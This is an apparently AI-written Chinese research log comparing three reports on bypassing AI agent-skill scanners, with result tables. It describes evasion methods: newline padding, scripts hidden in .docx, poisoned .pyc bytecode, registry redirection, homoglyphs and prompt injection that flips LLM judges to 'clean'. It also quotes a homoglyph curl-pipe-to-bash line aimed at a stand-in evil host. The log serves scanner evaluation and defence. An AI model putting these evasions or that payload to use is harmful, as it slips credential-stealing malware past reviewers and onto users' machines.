# gapB：「掃描器被繞過」三份研究逐字讀完紀錄與抽取

標記：【自述】=作者在原文自己說的；【第三方】=他人（CSA、媒體）對原研究的轉述；【推論】=我的判斷。引文皆英文原文，照抄。

## 0. 讀取紀錄

| 來源 | 工具（降級紀錄） | 長度 | 依序讀過的區間 | 是否被截斷 |
|---|---|---|---|---|
| ToB 部落格 | Groundlane web_fetch extract:"full" maxOutputChars:500000（第一棒就成功，沒降級） | 回傳 `bytes`=48,241（原始回應位元組）；`truncated:false`。內容是一次整段回傳在對話內，沒存檔，所以我沒有精確字元數 | [0, 結尾]，一次讀完。從標題 "The sorry state of skill distribution" 一路到 "Recent Posts / © 2026 Trail of Bits" 頁尾 | 否 |
| Adversa 部落格 | Groundlane web_fetch full，結果超過顯示上限，自動存成檔，我再存為 /tmp/claude-0/-home-user-quidproquo/294bb94c-7336-5c0f-a4c7-a0ff961e5680/scratchpad/src/adversa.md，用 python3 -I 分段印出 | 70,161 字元（python len；磁碟 70,574 bytes），`truncated:false`，原始回應 164,405 bytes | [0,17000) [17000,32000) [32000,47000) [47000,61000) [61000,70161)，首尾相接，無縫、無重疊遺漏。涵蓋 TL;DR、全部 A–J 類、誤報表、Disclosure、Appendix（方法、負面結果、矩陣、腳註、payload、Prior work: ToB）、頁尾 | 否 |
| CSA Lab Space | Groundlane web_fetch full | `bytes`=115,964（原始 HTML），`truncated:false`，一次回傳 | [0, 結尾]，Key Takeaways→Background→Security Analysis→Recommendations（Immediate / Short-Term / Strategic）→CSA Resource Alignment→References [1]–[12]→頁尾 | 否 |
| overtly-malicious-skills README | Groundlane（github.com 頁與 raw.githubusercontent.com） | 1,375 bytes | 全文 | 否 |
| overtly-malicious-skills 各案例檔 | curl raw.githubusercontent.com（可通）。blog.trailofbits.com 對 curl 是 403 被代理擋，所以部落格只走 Groundlane | 見下方 | 讀了 csv-summarizer/SKILL.md（279 B）、csv-summarizer/scripts/summarize.py（100,382 字元，其中 100,000 個換行，非空行只有 15 行）、context-loader/SKILL.md、simple-formatter/SKILL.md 與 scripts/utils.py、dev-env-setup/SKILL.md | 見缺口 |
| Cisco PR #25 | Groundlane 讀 github.com 頁 | 全頁 | 全讀（PR 描述、4 commits、review、merge） | 否 |
| NVIDIA SkillSpector CHANGELOG | 本機 /home/user/NVIDIA/skillspector/CHANGELOG.md | 35,072 字元 | [0,17500)+[17500,35072) 全讀 | 否 |
| SkillSpector README／原始碼 | 本機 | README 58,475 B | 只讀相關段落（20–40、555–600、940–1010 行與 grep），原始碼只 grep 與抽讀，未全讀 | 非全讀，結論標推論 |

缺口（誠實列出）：
1. ToB 部落格沒有精確字元數；`truncated:false` 加上讀到頁尾，我判定全文已讀。
2. overtly-malicious-skills 的 context-loader 內的隱藏 .docx（二進位）、simple-formatter 的 .pyc、dev-env-setup/scripts/bootstrap.sh，我沒有逐檔讀到。檔案清單頁對 curl 回 403，Groundlane 的 GitHub 頁面也沒列出子目錄。bootstrap.sh 的關鍵內容 ToB 部落格 Figure 7 有貼，.pyc 的反組譯片段 Figure 3 有貼。GitHub MCP 對該 repo 被拒（本 session 只允許 vincentxuu/quidproquo），我沒有自行 add_repo。
3. CSA 引用的 Bolha Sec（DEV Community）原文與 CyberSecurityNews 我沒讀，只讀到 CSA 的轉述。
4. 先前摘要：我手上沒有「先前摘要」文字可逐字對。下面第 8 節列的是原文之間、與你任務敘述之間的不一致。

---

## 1. (a) 被測掃描器、版本、條件

### ToB（2026-06-03）【自述】
測了 5 個產品/3 個平台，4 個惡意 skill。**ToB 沒給任何掃描器版本號**，只有 commit 連結（ClawHub 的 securityPrompt.ts 連到兩個不同 commit：`c3c885ec...` 與 `e8c3947b...`）。

| 掃描器 | 條件（原文） |
|---|---|
| ClawHub 掃描 | "a two-part scanning solution. One is an integration with VirusTotal, which checks for known malware signatures and uses a proprietary scanner called Code Insight, built on Gemini 3 Flash, under the hood. The other scanner is a custom harness and prompt for a guard model, by default GPT 5.5." |
| Cisco skill-scanner | "an open-source multi-engine system, combining an LLM-driven analyzer (that can be backed by various models) with basic text pattern-matching and a variety of more involved static analysis methods targeting control and data flows. The tool also integrates an LLM-based meta-analyzer". LLM judge **開啟**：輸出 JSON 顯示 `"model": "claude-sonnet-4-6"`；原文 "When configured to use Claude Sonnet 4.6 (a relatively strong model, especially for high-volume applications like scanning)" |
| skills.sh 的 Gen Agent Trust Hub / Socket / Snyk | "The skills.sh scanning works through integration with three external services: Gen Agent Trust Hub, Socket, and Snyk." 是外部服務，未寫模型、版本，也不知其 LLM 是否開 |
| 沒測的 | NVIDIA SkillSpector（ToB 全文無提及）。ToB 只說 Cisco 初測後送 PR |

### Adversa（2026-07-30）【自述】
8 個開源掃描器，全部離線、LLM judge 階段關閉（skillcop 例外，它本身就是純 LLM）。
- 原文：「All runs were offline, with the optional LLM judge stages that require an API key left off, matching the configuration most CI pipelines use.」
- 驗證規則：「malicious if at least one high or critical attack intent finding fires, with posture and hardening checks excluded」（Adversa 自訂的統一規則）。

| 代號 | repo | 語言 | 偵測技術 | 離線旗標 / 實測方式 |
|---|---|---|---|---|
| Cisco | cisco-ai-defense/skill-scanner | Python | static regex, YARA, Python AST, bash taint, bytecode, LLM judge | engines 1–4；只做 6/6 spot-check 重建驗證 |
| NVIDIA | NVIDIA/SkillSpector | Python | regex banks, AST, taint, YARA, sig-DB, LLM judge | `--no-llm`；「repaired from its own `__pycache__` bytecode and checked against the retained finding ID scheme, a weaker validation than the other four」；版本未載明 |
| mondoo | mondoohq/skillcheck | Go | SHA-256 查雲端資料庫 | 真實 binary，離線＝一律 unknown→clean |
| skillcop | cfitzgerald-pd/skillcop | Bash+Python | 只有 LLM judge | 本機 Ollama：gemma3:12b（文件預設）與 llama3.2:3b，temperature 0，兩次相同 |
| claude-av | claude-world/claude-skill-antivirus | Node.js | ~250 regex、9 engines、blocklist | 重建，240/240 對齊舊 bake-off 判定 |
| huifer | huifer/skill-security-scan | Python | 純 regex，13 rule IDs | 重建，240/240 |
| ai-skill | suchithnarayan/ai-skill-scanner | Python | LLM-first；235 YAML rules+AST+taint | `--static`；重建 239/239 |
| HMA | opena2a-org/hackmyagent | TypeScript | 209 checks、AST、byte-level stego、3M-param ONNX 分類器 | v0.25.0（榜單條目為 v0.23.8），真實安裝 |

Adversa 另有對照組：每類攻擊皆跑「未混淆對照」。六個良性 baseline：「empty template, 23 KB pad, 100,000-newline flood, curl to an API, curl piped to jq, echo piped to tee」。

### CSA（2026-06-10）【第三方】
自己不測；列 ClawHub（VirusTotal Code Insight）、Cisco、skills.sh 三家、NVIDIA SkillSpector（"64 detection patterns across 16 vulnerability categories"、"approximately 87% precision"），並轉述 Bolha Sec 的 DEV 文章測 Socket/Snyk/Gen。

---

## 2. (b) 繞過手法 × 掃描器 × 成敗

### 2.1 ToB 四個 skill【自述】
**ToB 沒有公布「每個 skill × 每個掃描器」的完整成敗矩陣，也沒有成功/失敗比例。** 只有下列敘述與截圖。

| skill（repo README 的描述） | 手法 | 原文對成敗的描述 | 對象 |
|---|---|---|---|
| csv-summarizer | 在無害樣板與惡意碼之間塞 100,000 個換行 | 「The OpenClaw scanner truncated the file and missed the malicious content entirely, while the VirusTotal scanner model seemed to become confused.」「We bypassed both checks」 | ClawHub 兩層（GPT guard + VT Code Insight）都過。**只測 ClawHub** |
| context-loader | SKILL.md 指示 agent 從 .docx（ZIP of XML）抽指令，ZIP 內夾 `sync1.sh` | 「This simple attack reliably beats pattern-match-based scanning, and has a decent success rate against the LLM-based scanners as well.」沒給數字 | skills.sh 三家 + Cisco（「The next set of scanners」）；逐家成敗未列 |
| simple-formatter | `.pyc` bytecode 中毒，偷環境變數 | skills.sh 顯示通過（Figure 4 截圖，部落格文字沒逐家列）；Cisco `"is_safe": true, "max_severity": "SAFE", "findings_count": 0`。「skill-scanner's static analyzers did not investigate the `.pyc` bytecode, nor were the LLM analyzer's own skills sophisticated enough」 | skills.sh + Cisco |
| dev-env-setup | 提示注入：把 npm/yarn registry 改指攻擊者站，包裝成公司內部 mirror 與 AppSec 稽核語言 | Cisco（Sonnet 4.6）給 3 個 LOW、`is_safe: true`；「Overall, Cisco's scanner reliably declared the skill safe. The skills.sh scanners did the same.」 | Cisco + skills.sh；耗時：「this was our only attack that took multiple hours to implement」 |

整體口徑：「We recently bypassed ClawHub's malicious skill detector, Cisco's agent skill scanner, and all three of the scanners integrated into skills.sh.」「it took us less than an hour to conceive and implement three of the four malicious skills」。

另外：Cisco 對 Anthropic 官方 Office skill 的 `soffice.py`（LD_PRELOAD）：LLM analyzer 標 LOW，一條 pattern rule 標 MEDIUM。這是「合法 skill 看起來像惡意」的反例，不是繞過。

### 2.2 Adversa 11 類（皆為「control 抓到、混淆版沒抓到」才叫 Bypassed）【自述】
定義：「**Bypassed** means the scanner detected the plain attack and missed the disguised one… **Blind** means it missed the plain attack too… **Instructed** means the file under analysis told the scanner what to conclude.」

矩陣（B=繞過 P=部分 C=抓到 ∅=blind；列於 Appendix）：

| 類 | 手法 | Cisco | NVIDIA | mondoo | skillcop | claude-av | huifer | ai-skill | HMA |
|---|---|---|---|---|---|---|---|---|---|
| A | base64/hex/ROT13/gzip 包裝 | ∅ | C | ∅ | d | P | B | B | B |
| B | 同形字／零寬／軟連字號 | ∅ | P | ∅ | d | B | B | B | B |
| C | shell 重組（`${c}rl`、`$IFS`…） | ∅ | C | ∅ | d | P | B | P | B |
| D | 行錨定／大小上限（反斜線續行、23KB 墊、10 萬換行） | ∅ | C | ∅ | d | C | P | C | P |
| E | 子字串白名單 `github.com.attacker.com` | ∅ | C | ∅ | d:– | C | P | C | C |
| F | 純簽章 | ∅ | C | ∅ | d | C | C | C | C |
| G | 打包腳本（SKILL.md 乾淨、scripts/setup.sh 惡意） | ∅ | C | ∅ | d | C(僅 zip 全檔設定) | C | C | B |
| H | 對 LLM judge 注入 | d | d | d:– | **B** | d:– | d:– | d | d |
| I | 改寫／西班牙文 | **B** | **B** | ∅ | d | **B** | ∅ | **B** | **B** |
| J(a) | 執行期抓第二階段 | 無 package 內 payload，五家標 fetch 形狀（NVIDIA、claude-av、huifer、ai-skill、HMA） | | | | | | | |
| J(b) | 文字轉圖片 | ∅ | **B** | ∅ | d | ∅ | **B** | **B** | ∅ |
| 跨檔 taint | | C | C | ∅ | d | ∅ | C | C | ∅ |
| 偽裝散文外洩 | | ∅ | C | ∅ | d | ∅ | C | C | ∅ |

比例（我依矩陣算，【推論】）：
- Adversa 的「全部 8 個都被穿過」是以「至少一種手法讓惡意 skill 通過」為準，其中 6 個靠繞過（B）、mondoo 因離線什麼都不查、skillcop 因 judge 注入。原文：「A malicious skill got past all eight: six through a bypass, one because it inspects almost nothing, one because the file can instruct it.」
- 「27 格是 blind」：「Twenty seven of the cells that look like bypasses are family blind spots」。
- **Cisco 真正的「繞過」只有 I（改寫）一類；其餘全 ∅**。Adversa 自己的解釋是 Cisco "is blind to the prose command and exfil families by construction"，也說它 "an excellent code analyzer"。
- **NVIDIA 在 11 類中 B 只有 I、J(b)，P 只有 B（同形字）**，其餘都抓到；且 Adversa 強調抓到的原因是「residual `| sh` tell」，隱藏執行形式會恢復繞過：「A one-line hidden-exec change puts the bypass back on every scanner whose catch was the residual pipe.」（原文 footnote 1：NVIDIA「**misses** a base64 form that decodes to a file and executes separately (both measured)」）。
- ToB 的 10 萬換行對 NVIDIA、claude-av、ai-skill 在 Adversa 測試中**被抓到**：「a 100,000-newline flood was actually _caught_ by NVIDIA, claude-skill-antivirus and ai-skill-scanner」。

### 2.3 Adversa 的 H 類（skillcop）數字【自述】
| 受測 | gemma3:12b（預設） | llama3.2:3b |
|---|---|---|
| 良性天氣 skill | clean | clean |
| 真 pipe-to-shell，無注入 | blocked, CRITICAL | blocked, CRITICAL |
| ＋一行要求回傳 clean | **blocked（抵抗）** | **clean（翻轉）** |
| ＋framed injection（分析邊界標記、假的放行工單 SEC-4471、把 payload 說成 fenced-block 佔位） | **clean（翻轉）** | **clean（翻轉）** |

原文限定詞：「The default 12B model is not fooled by a naive one-liner, which is the honest and important qualifier.」

### 2.4 Adversa 的誤報／噪音（MalSkillBench 7,797 筆，含 4,000 真實良性）【自述】
| 掃描器 | precision | recall | F1 | FPR | 誤報 |
|---|---|---|---|---|---|
| flag-everything | 0.487 | 1.000 | 0.655 | 1.000 | 4,000 |
| huifer | 0.490 | 0.631 | 0.551 | 0.624 | 2,496 |
| claude-av | 0.516 | 0.580 | 0.546 | 0.520 | 2,052/3,947 |
| NVIDIA | 0.666 | 0.438 | 0.528 | 0.209 | 835 |
| Cisco | 0.784 | 0.330 | 0.464 | 0.086 | 344 |
| HMA v0.25.0 | 0.477 | 0.421 | 0.447 | 0.438 | 1,753 |
| ai-skill | 0.516 | 0.281 | 0.363 | 0.250 | 1,001/3,999 |
| mondoo | — | 0.000 | 0.000 | 0 | 0（7,291 筆，排除 506） |
結論原文：「No scanner in the field beats a flag-everything baseline.」

### 2.5 CSA 第三方版本的偏差【第三方／推論】
- 「No single scanner caught all four malicious skills. Some caught none.」→ ToB 原文沒有這種逐家統計，CSA 是推演。
- 「VirusTotal's Code Insight … failed to classify the resulting file as malicious」比 ToB 的 "seemed to become confused" 說得更肯定。
- 「The LLM scanner encountered plausibly authoritative language …, downgraded its risk assessment, and approved the skill」：ToB 原文是 Cisco 仍標了 3 個 LOW，只是最終 is_safe:true。
- 「Trail of Bits bypassed five distinct scanning products across three separate platforms」：ToB 實際列出的是 ClawHub（含 VT Code Insight 與 GPT guard 兩層）、Cisco、Gen、Socket、Snyk；CSA 把 ClawHub 算成一個。
- CSA 說 SkillSpector 的限制與 ToB 兩個繞過「the same format categories」，是 CSA 自己的類比（SkillSpector 沒被 ToB 測過）。
- Bolha Sec（CSA ref [2]，CSA 自標 "Community blog; methodology not peer-reviewed"）：Socket 在任何條件都沒有 Critical/High；Snyk 被 split-stream 降到 Medium；Gen 全程維持。這是第三方轉述，我沒讀原文。

---

## 3. (c) 研究者自述的限制與方法論弱點

### 3.1 「讀碼預測 77 格錯 53 格」核對原文脈絡【自述】
原文（Appendix "What changed when we ran it"）：「Reading source predicted one thing; running the scanners produced another in 53 of the 77 comparable cells (the 11 fully measured classes × 7 live scanners; Class H and J(a) are derived, not run, and are excluded from the denominator).」
拆解：27 格「predicted a bypass or a catch, measured _blind_」＋ 21 格「predicted a bypass, measured _caught_」＋ 5 格「predicted partial, measured _full bypass_」＝53。
關鍵脈絡：
- 「錯」指的是 **Adversa 自己第一輪「讀原始碼做的預測矩陣」與實測不符**，不是掃描器表現，也不是 ToB 的結果。
- 方向是雙向：21 格太嚴苛、5 格太寬鬆，27 格是「根本 blind」。原文：「Source reading mis-estimated in both directions at once」。
- 這被當作方法論論點：「Any coverage claim in this domain that was reasoned from source and not executed should be treated as a hypothesis. Ours were.」和 NVIDIA 相關：「Had we published the source-read matrix, NVIDIA could correctly have said we never ran it and it catches the payload.」
- 分母 77＝11 類×7 個實跑掃描器，**不含 skillcop**。
【推論】這個數字說明的是「靠讀碼推測掃描器會不會被繞過不可靠」，不能反過來說「掃描器有 69% 實測被繞過」。

### 3.2 Adversa 其他自述弱點
1. LLM judge 階段全關（API key 需求），所以 Cisco/NVIDIA/ai-skill/HMA 的「LLM 層」沒被測；Adversa 對 Cisco 的 prompt construction：「we did not examine Cisco's prompt construction, so we make no claim about it」。
2. 重建而非真實安裝：claude-av、ai-skill、huifer 用「reconstructions validated cell for cell」；NVIDIA 用 `__pycache__` 修復，「a weaker validation」；Cisco 只 6/6 spot-check。
3. 語料缺陷：「Thirteen percent of the malicious set (493 entries) are empty directories, so achievable recall … is capped at 0.870」；`_meta.json` 標籤洩漏（良性 3,878/4,000 有、惡意 0/3,797 有）；「These seven rows were measured before that defect was found and were not re-run… its row is flattered by an unquantified amount.」
4. 判定規則是自己統一的；Cisco 最受規則影響：標準 0.784/0.330，Cisco 自家 strict policy 0.803/0.408，balanced 0.833/0.375。
5. HMA 版本不同：榜單 v0.23.8，本文 v0.25.0。
6. 自家 `pinion-skill-scan` 不列入，後一個 build F1 0.672、635 誤報、FPR 15.9%，「not strictly comparable」。
7. Class J(a) 無混淆版可比，標 derived；H 類與 J(a) 排除於 77 格。
8. 集成評估：「That comparison joins 163 of the 191 payloads; 28 rows shared IDs with earlier rows and were dropped by an ID-keyed scorer.」
9. 「What did not work」：固定 harness 測不出穩健性（自家掃描器 adaptive red team 178/191 通過，偵測率 6.8%，修補後 48.2%）；ML（線性 n-gram）held-out F1 0.951 但轉移失敗（3,748/3,975 良性被標，precision 0.087）；ensembling 最佳 precision 配對對 adaptive 攻擊只偵測 1.2%，OR-of-three 62.0% vs 最佳單一 50.9%。這些是**對 Adversa 自家 scanner / 自家實驗**的負面結果，不是對 8 個受測掃描器。
10. 「Class I … No static rule closes this one; we tried and failed.」

### 3.3 Adversa 內部不一致（我發現的）【推論】
- 正文：「Seven of the eight were executed live against the payload families; skillcop … was run end-to-end against local models」；Reproducibility 表：「derived, not run — skillcop, whose Class-H cell was measured separately end-to-end」；矩陣中 skillcop 除 H 外各格是 `d`（derived）。三處對 skillcop 的 live/derived 說法不完全同調。
- TL;DR 「A third of the apparent coverage is blindness」是 27/77≈35%，但「27 cells」在正文又寫成「Twenty seven of the cells that look like bypasses」，兩者語義是「預測成 bypass/catch 的 27 格」與「看起來像 bypass 的 27 格」略有出入。
- 「6 個靠繞過」：其中 Cisco 只有 I 類 B，其餘為 ∅，標題 "A hole in every one" 對 Cisco 的主要證據是「改寫注入」與「prose 家族 blind」。

### 3.4 ToB 自述弱點
- 沒有量化，沒有負面結果，沒有版本；用 "attacker can move second" 論證靜態目標讓迭代無成本：「their static nature gives an adversary unlimited bites at the apple」。
- 明說自己改 Cisco 的 PR 效果有限：「even these improvements were quite limited. The changes have no effect on the prompt injection approach」。
- 結論性斷言「No amount of scanning or LLM analysis can reliably detect malicious content in agent skills」，證據是 4 個自製 skill，屬於「存在性證明」，不是偵測率研究。【推論】
- 利益：見第 6 節。

---

## 4. (d) 廠商回應、修補、重測

| 廠商/專案 | 資料 | 來源性質 |
|---|---|---|
| Cisco skill-scanner | ToB 在 2026-02-17 送出 PR #25「Add strict structure validator and JS/TS scanner support」（tjade273，trail-of-forks），**同日由 vineethsai7 approve 並 merge**（"Looks good. Thank you for contributing!"）。內容：`strict_structure.py`（15 個錯誤碼，擋隱藏檔、symlink、二進位、非 UTF-8 等）、JS/TS 規則、`Remove dangerous analysis bypass of pycache and hidden files`。PR 自述對 skills.sh 前 100 名 skill 評估：strict validator 誤報率 31.5%→21.7%。**這 merge 發生在 ToB 部落格（6/3）前三個半月。** ToB 部落格另說 PR 對 prompt injection 無效 | 【自述】+ 我讀的 PR 頁（一手） |
| Cisco 對部落格的公開回應、後續修補 | 兩篇文章都沒有。我也沒查 Cisco repo 後續 commit（GitHub MCP 對該 repo 被拒；只讀到 PR 頁） | 缺口 |
| ClawHub / VirusTotal / Vercel(skills.sh) / Gen / Socket / Snyk | ToB 全文沒有任何廠商回應或揭露時程描述；沒有後續重測 | 【自述】無；我沒另查各家 changelog |
| NVIDIA | ToB 沒測 NVIDIA。Adversa 測了 NVIDIA 但**沒有通知 NVIDIA**（見下）。兩文皆無 NVIDIA 回應 | 【自述】 |
| Adversa 揭露 | 「Class A, B, C, D, G, I and J are a shared design gap … There is no vendor to notify about an industry-wide omission」；只有兩個「genuine defects」（huifer 的 substring allowlist、skillcop 的未跳脫串接）：「We are filing both on the projects' public issue trackers and have not embargoed this piece on a response.」mondoo 「documented behavior」不揭露。**沒有對 Cisco、NVIDIA 揭露或重測的敘述** | 【自述】 |
| CSA | 無廠商回應，也沒有重測；只有 "Recommendations" | 【第三方】 |

CSA Recommendations 全文要點（讀到結尾）：Immediate：把公開市集 skill 當 untrusted code、釘版本（防 rug pull）、skill 層最小權限；Short-term：加執行期監控（舉 Repello SkillCheck 為例）、優先策展來源、評估 LLM 掃描層是否有淨效益（"may not justify the added complexity"）；Strategic：npm 2010s 中期類比、投資 provenance/簽章（Sigstore、PyPA）、defense-in-depth。結論句直接引 ToB：「Don't outsource trust to a scanner」。

---

## 5. 與 NVIDIA/ToB 的交集釐清【推論】
- ToB 的 4 個 skill **沒有一個被報告測過 SkillSpector**。
- 對 SkillSpector 的實測只來自 Adversa（靜態 `--no-llm`）。Adversa 的 prior work 段承認與 ToB 的差異：「They attacked the container and the process… We attacked the pattern matching layer itself」，且 Adversa 沒有把 ToB 的 4 個 skill 餵給 8 個掃描器重跑。

---

## 6. (e) 利益關係

【自述／可由頁面直接看到的事實】
- Adversa AI：頁面導覽是商業產品（「Platform」「Book a demo」「Coding Agent Security Platform」「AI Red Teaming - Agentic AI／LLM／MCP」「Secure AI Assessment」…），頁尾「A runtime control layer for AI coding agents. Stops dangerous coding agent actions before they become the incident.」；頁首推廣自家 AIRQ 評級報告（airq.adversa.ai）。
- 文中自承：「A row for our own scanner, `pinion-skill-scan`, is omitted: we build it, and including it would turn a survey of the field into a comparison.」→ Adversa 自己開發一個同類掃描器；文章結論「Treat any scanner as advisory… ask about the front end」「The eleven-point spec … Send it to your vendor, or implement it if you are building one.」也服務於其產品敘事。
- 文章把「執行期／行為層」列為 out of scope：「Out of scope: … runtime enforcement inside the agent」；而它自家平台主打 runtime 控制（頁尾文案）。【推論】這與「靜態掃描器不可靠」的結論方向一致，利益相關。
- 它同時揭露自家掃描器的壞成績（adaptive 偵測 6.8%→48.2%、FPR 15.9%），這是對利益偏誤的部分抵銷。【推論】
- ToB（同樣有利益，補充）：Trail of Bits 是安全顧問公司；推薦自家策展庫「trustworthy open-source collections like our own trailofbits/skills-curated」，且 PR 自己送進 Cisco repo。結論「use curated marketplaces」直接導向自家 skills-curated。【自述事實＋推論】
- CSA 文：點名推薦 Repello SkillCheck（引用 Repello AI 部落格 [7]）；整篇可見由「CSA AI Safety Initiative」署名、無個人作者，行文與引用格式像是綜述體。屬第三方彙整，無獨立測試。【推論】

---

## 7. (f) NVIDIA SkillSpector：怎麼被繞過、現行版本有沒有針對性規則

### 7.1 Adversa 實測 NVIDIA 的結果（`--no-llm`，版本未載明）【自述】
- **B 同形字：部分繞過**。「The homoglyph, which rewrites the whole line into confusable characters and still leaves a visible pipe, evades NVIDIA too.」Payload：`сurl -sL httрs://gеt.еvil.iо/i.sh | bаsh`（Cyrillic 混字）。原因：「No scanner NFKC-folds the text before its command bank runs」。零寬與軟連字號變體被抓，但原因是殘留的 `| bash` 字面，不是正規化。
- **I 改寫／西班牙文：繞過**。「NVIDIA's primary injection rule needs one of `previous|prior|above` plus a specific verb in a fixed connective slot.」
- **J(b) 文字轉圖片：繞過**（抓得到純文字版、抓不到圖片版）。
- A（編碼）、C（shell 重組）、D（大小/10 萬換行）、E、G、跨檔 taint、偽裝散文外洩：被抓，但原因多為 residual `| sh` 與獨立的憑證檔讀取規則。Adversa 另測出 NVIDIA 對 `echo 'hello world' | sh` 也會報（誤報來源）。
- 其他：NVIDIA 獨立抓到 16 個 adaptive 攻擊別人沒抓到；severity gate 被 Adversa 視為「correct pattern」。

### 7.2 本機 clone 現況（/home/user/NVIDIA/skillspector；HEAD 11c8b48，最新 commit 2026-10-20；pyproject version = 2.12.0 (Unreleased)）
CHANGELOG 全讀。依各手法對照，**沒有任何一條 commit/changelog 提及 Adversa、Trail of Bits 或 overtly-malicious-skills**（我用 word-boundary grep 全 repo 無命中）。以下是「功能上相關」而非「針對該研究」：

| 手法 | SkillSpector 現況 | 證據 | 判斷 |
|---|---|---|---|
| 同形字（Adversa B） | 有 NFKC + Unicode UTS #39 ASCII-skeleton 的「normalized security view」：`unicode_confusables.py`（Unicode 17.0.0 資料，1,527 行）、`artifacts.py` 的 `normalized_security_view`；CHANGELOG 2.11.1「fix(security): normalize concealed instruction text (#408)」；commits 73dd1f1（8/21 Security fixes #393）、1210b82（8/24 harden concealed instruction detection）、3d89803（8/25 broaden concealed command evidence）；2.3.0 已有 P2 bidi（CVE-2021-42574），2.3.5/2.3.8 有 Unicode Tag-block "ASCII smuggling" | 時間在 Adversa 發文（7/30）之後；**我沒有實際把 Adversa 的 `сurl … | bаsh` 丟進現行版跑**，也沒追到指令規則庫是否確實對 normalized view 重跑。結論：功能上很可能補上，**未驗證** |
| 改寫／翻譯注入（Adversa I） | **沒有針對性規則**。README Limitations 仍寫 "Non-English content: May miss patterns in other languages"；P7 是 system-prompt 外洩，與改寫無關；有 contrib/batch_scan 的多語系批次掃描（zh/ja/ko），不是偵測規則。LLM 階段（可選）才可能涵蓋 | README line 994–998、P7 表 | 未補（靠 LLM 層）|
| 文字轉圖片（Adversa J(b)） | README Limitations 仍寫 "Image-based attacks: Cannot analyze text in images"；僅 AE1 區分「passive PNG reference」（#597），無 OCR | README、CHANGELOG | 未補 |
| `.pyc` bytecode（ToB，Adversa 未測） | SC8「Shipped Python Bytecode」HIGH：2.9.4（2026-08-12，#357）「HIGH SC8 when skill ships __pycache__ or .pyc」；後續 #571 虛擬環境內 bytecode、#828 bytecode walk 5s 預算（2.12.0 Unreleased）。README SC8 欄「`__pycache__` / `.pyc` present (discovery skips; malicious bytecode bypass)」 | 偵測的是「有出貨 bytecode」本身，不是反組譯內容 | 有針對性（以「出現即 HIGH」處理）|
| docx/ZIP 夾腳本（ToB context-loader） | 2.10.0（2026-08-26）：「Inspect hidden and nested ZIP-compatible artifacts」「Report HIGH SC9 findings for executables concealed in documents or hidden/disguised artifacts」；docs/NESTED_ARTIFACT_INSPECTION.md 明列 DOCX/XLSX/PPTX | CHANGELOG、docs | 有針對性 |
| registry 改指攻擊者（ToB dev-env-setup） | SC10「Dependency Source Redirection」HIGH：npm `.npmrc`、Yarn、pip、Poetry、Maven、Cargo；docs/DEPENDENCY_SOURCE_REDIRECTION.md 寫明「does not maintain an organization allowlist … make a reputation judgment」，且「SC10 remains HIGH through optional LLM meta-analysis」。這正是 ToB 的敘事型提示注入（企業 mirror 說詞）無法降級的設計 | docs、README SC10 | 有針對性（確定性規則，不吃說詞）|
| 10 萬換行／填充（ToB csv-summarizer；Adversa D） | 2.9.4 起 P9「Detect whitespace padding used to hide prompt-injection instructions」(#24)、MP2 context stuffing；AE7 oversized-file coverage gap（#509）。Adversa 已測舊版就抓得到 flood | CHANGELOG | 已有且持續維護 |
| LLM judge 被說服（ToB／Adversa H） | 早有 meta-analyzer severity floor（2.3.5/2.3.6）；README：「Confirmed findings may gain an explanation and higher confidence, never lower」「Every deterministic finding stays in the report」；「The LLM prompt includes anti-jailbreak protections」 | README "Stage 2" | 設計上有 |
| 子字串白名單（Adversa E） | 無需要：對 NVIDIA 本來就是 C | | — |

CSA 數字與現況不符【推論】：CSA 寫 "64 detection patterns across 16 vulnerability categories"、"approximately 87% precision"；現行 README 寫 "71 vulnerability patterns across 17 categories"，且 README Stage 2 寫 "Stage 2 does not replace deterministic findings or guarantee a particular precision rate"，grep 不到 87%。CSA 引的應是 5 月初版 README。87% 我無法在現行檔驗證。

---

## 8. 與先前摘要／任務敘述不一致處

我沒有「先前摘要」原文，所以只能列原文之間與任務敘述之間的出入：
1. 任務敘述把兩份研究並列為「掃描器被繞過」。實際上 ToB 沒測 NVIDIA；NVIDIA 只在 Adversa（靜態 `--no-llm`）與 CSA（無測試）出現。
2. 「77 格錯 53 格」是 Adversa 自己的讀碼預測失準，不是掃描器被繞過的比例（第 3.1）。
3. CSA 對 ToB 的幾處加強語氣（"Some caught none"、"failed to classify"、"five distinct products"）在 ToB 原文找不到（第 2.5）。
4. Adversa 說 ToB 第四個攻擊「Classified LOW severity」：與 ToB 一致（Cisco 3 個 LOW、is_safe:true），但 Adversa 的「across platforms」比 ToB 原文更概括（ToB: "Cisco's scanner reliably declared the skill safe. The skills.sh scanners did the same."）。
5. Adversa 對 ToB 的描述「`.docx` … They report it reliably defeats pattern matching scanning」與 ToB 原文一致，但省略 ToB 的另一半「decent success rate against the LLM-based scanners」。
6. 你的任務敘述寫 Adversa 日期 2026-07-30、ToB 2026-06-03、CSA 2026-06-10：逐項核對皆相符。
7. 任務敘述說「若存在，一併找 CSA」：存在，且已讀到 Recommendations 結尾與 References。

---

## 9. 一句話結論（【推論】）
- 兩篇都是「存在性證明＋設計缺陷分析」，不是偵測率研究：ToB 無數字；Adversa 的數字多數是離線、LLM 關閉、含重建版本、含已知語料缺陷的結果。
- 對 NVIDIA 能成立的實測結論僅限：靜態模式下，同形字（部分）、改寫／非英文注入、圖中文字三者過關；其餘多靠殘留 `| sh` 抓到。現行 repo 在同形字正規化、bytecode、嵌套 ZIP、registry 重導、空白填充上都有新規則，改寫與圖片仍列為已知限制。
- 沒有任何一方公開報告過廠商回應或重測；唯一確證的廠商互動是 Cisco 在 2026-02-17 merge ToB 的 PR #25。
